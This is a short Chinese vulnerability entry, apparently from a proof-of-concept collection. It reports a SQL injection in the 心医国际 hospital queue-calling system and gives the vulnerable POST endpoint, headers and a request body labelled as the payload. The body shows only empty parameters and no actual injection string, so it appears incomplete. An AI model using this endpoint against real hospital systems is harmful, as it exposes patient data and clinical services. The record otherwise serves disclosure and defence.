# 心医国际排队叫号系统SQL注入漏洞

- **系统**：心医国际排队叫号系统　|　**类型**：SQL注入　|　**CVE**：—
- **请求**：`POST /showqueue/showqueue/patient/queryQueueInfo HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded; charset=UTF-8`　`Content-Length: 104`

**请求体 / payload**
```
patientstatus=&queueID=&department=&waitarea=&name=&startTime=&endTime=&curPage=0&queueNumber=&operator=
>
```

**其他**
- 版本: 心医国际排队叫号系统